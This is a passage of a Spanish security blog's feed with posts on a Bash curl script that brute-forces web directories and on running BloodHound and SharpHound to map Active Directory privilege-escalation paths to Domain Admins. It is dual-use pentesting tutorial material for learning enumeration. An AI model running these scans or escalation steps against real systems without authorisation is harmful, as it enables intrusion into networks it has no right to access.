&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="script" /><category term="API KEY" /><category term="web" /><category term="Bug Bounty" /><summary type="html">En este artículo, explico la utilidad de la herramienta subdomainDump.sh, escrita en Bash.</summary></entry><entry><title type="html">simpleCurlScan</title><link href="http://localhost:4000/curl/" rel="alternate" type="text/html" title="simpleCurlScan" /><published>2021-09-22T00:00:00+02:00</published><updated>2021-09-22T00:00:00+02:00</updated><id>http://localhost:4000/curl</id><content type="html" xml:base="http://localhost:4000/curl/">&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;960&quot; height=&quot;700&quot; src=&quot;/assets/images/curl/curl.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;qué-es-simplecurlscan&quot;&gt;¿Qué es simpleCurlScan?&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;simpleCurlScan&lt;/strong&gt; es una herramienta creada en bash. Creé este pequeño script en base a la necesidad de realizar escaneo de directorios en una máquina remota la cual estaba bastante “desnuda”, en el sentido que python no estaba instalado (por ejemplo) o varios programas de linux que són altamente necesarios para realizar una mínima enumeración.&lt;/p&gt;

&lt;p&gt;La herramienta funciona haciendo fuerza bruta con un diccionario, el cual contiene un gran número de potenciales directorios.&lt;/p&gt;

&lt;p&gt;Para obtener los directorios/archivos que existen en la máquina remota, el script se basa en la respuesta del lado del servidor, por ejemplo, si hacemos la siguiente request (suponiendo que el directorio no existe):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1/noExisto&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;El codigo http que nos dará es 404, ya que el servidor no puede encontrar la ruta solicitada. En cambio, si probamos otro directorio (suponiendo que dicho directorio si existe):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1/admin.php&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Los códigos que podemos obtener para hacernos la idea que dicho directorio/archivo funciona, son 200 (directorio/archivo existe y se puede ver por el usuario), 301 (directorio/archivo existe pero se nos está redireccionando a otro lugar) o el 403 (directorio/archivo existe pero el usuario no tiene permiso para ver el contenido). Esté último nos interesa ya que, en caso de tratarde de un directorio, podríamos listar subdirectorios/archivos.&lt;/p&gt;

&lt;p&gt;Para utilizar esta herramienta, es tan fácil como:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./simpleCurlScan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;El script funcionará iterando sobre cada una de las lineas del diccionario que le pasemos, recomiendo utiizar este:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/directory-list-2.3-medium.txt&quot;&gt;https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/directory-list-2.3-medium.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;El código del script es el siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;file &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;file.txt&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;exist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;%{http_code}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  http://127.0.0.1/&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 200 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
		&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; - Existe&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 301 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
		&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; - Existe&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 403 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
		&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; - Existe&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;wait&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En caso que la máquina no disponga de curl instalado, se puede utilizar con el binario ya compilado:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/moparisthebest/static-curl/releases/tag/v7.79.1&quot;&gt;https://github.com/moparisthebest/static-curl/releases/tag/v7.79.1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Simplemente se tiene que añadir la ruta completa del binario de curl y con esto se podrá ejecutar sin problema.&lt;/p&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="script" /><category term="shell" /><category term="enumeration" /><category term="curl" /><category term="web" /><summary type="html">En este artículo, explico la utilidad de la herramienta simpleCurlScan, escrita en Bash.</summary></entry><entry><title type="html">BloodHound</title><link href="http://localhost:4000/bloodhound/" rel="alternate" type="text/html" title="BloodHound" /><published>2021-09-07T00:00:00+02:00</published><updated>2021-09-07T00:00:00+02:00</updated><id>http://localhost:4000/bloodhound</id><content type="html" xml:base="http://localhost:4000/bloodhound/">&lt;h2 id=&quot;qué-es-bloodhound&quot;&gt;¿Qué es BloodHound?&lt;/h2&gt;

&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;960&quot; height=&quot;700&quot; src=&quot;/assets/images/bloodhound/bh.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;BloodHound es una herramienta enfocada en la enumeración de Active Directory. BloodHound ayuda a los atacantes a identificar rutas de ataque altamente complejas que de otra forma sería mas complicado visualizar. Esta herramienta es muy útil, ya que representa de forma gráfica los resultados, se utiliza tanto para “red team” como para “blue team”, ya que a fin de cuentas, sirve para enumerar vectores de ataque/vulnerabilidades en un Controlador de Dominio.&lt;/p&gt;

&lt;h2&gt;Instalación de la base de datos&lt;/h2&gt;

&lt;p&gt;Para el uso de BloodHound, es necesario disponer de la base de datos neo4j. Para una instalación rápida:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt update &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;neo4j
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cuando esté instalada, se tiene que iniciar:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;neo4j start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Con esto, nos abrirá un servidor http que será accesible des del navegador web. Tendremos que loggearnos y crear un nuevo usuario/contraseña.&lt;/p&gt;

&lt;h2&gt;Instalación de BloodHound&lt;/h2&gt;

&lt;p&gt;Para utilizar BloodHound, recomiendo utilizarlo descargando el binario, pero se puede instalar también:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt update &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;bloodhound
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;La forma de utilizarlo sin necesidad de instalarlo es descargarlo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/releases/download/4.0.3/BloodHound-linux-x64.zip&quot;&gt;https://github.com/BloodHoundAD/BloodHound/releases/download/4.0.3/BloodHound-linux-x64.zip&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Con el siguiente comando, debería funcionar sin problemas:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bloodhound &lt;span class=&quot;nt&quot;&gt;--no-sandbox&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora que ya tenemos preparada la base de datos, tenemos que utilizar el recurso llamado SharpHound.exe, este script, en el sistema, realizará la enumeración de forma automática:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors&quot;&gt;https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;C:\Windows\Temp\test&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\SharpHound.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;----------------------------------------------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Initializing&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SharpHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;14:06&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;07/09/2021&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;----------------------------------------------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Resolved&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Collection&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Methods:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Sessions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LoggedOn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Trusts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ACL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ObjectProps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LocalGroups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SPNTargets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Container&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Creating&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Schema&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SI4CORP.LOCAL&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;Configuration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;si4corp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Found:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Objects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Pre-populating&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Controller&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SIDS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Status:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;Using&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RAM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Status:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/s&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Using&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RAM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Enumeration&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;00:00:00.3215783&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Compressing&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\20210907140603_BloodHound.zip&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;can&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;directly&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;UI&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;


&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharpHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Enumeration&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Completed&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;14:06&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;07/09/2021&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Happy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Graphing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como vemos, se ha generado el archivo “20210907140603_BloodHound.zip”, este archivo lo tendremos que transferir a nuestra máquina atacante y arrastrar el archivo en bloodhound:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/bloodhound/blood.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2&gt;Como utilizar BloodHound?&lt;/h2&gt;

&lt;p&gt;Cuando haya cargado, tendremos varias opciones de listar el sistema, para este ejemplo, he puesto la que más contenido salía (shortest path to high value targets).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/bloodhound/grafico.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En BloodHound, tendremos la posibilidad de indicarle al programa con que usuarios tenemos acceso al sistema y, a través de dicho usuario, como poder escalar privilegios, por ejemplo, si estamos en el caso que tenemos acceso a un usuario (ej: e1abrador) y queremos ver si estamos en algún grupo el cual sea vulnerable a la escalada de privilegios, lo podemos hacer de la siguiente manera:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;El primer paso sería marcar el usuario e1abrador como &lt;b&gt;owned&lt;/b&gt; (click derecho en el usuario y “Mark user as Owned”).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;El siguiente paso sería buscar el grupo que queremos utilizar para realizar la escalada de privilegios, en este caso, “Account Operators”, y marcarlo “Mark group as Owned”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Finalmente, buscamos el grupo objetivo, que normalmente es “Domain Admins”, le daremos a click derecho y “Shortest path to here from owned”&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

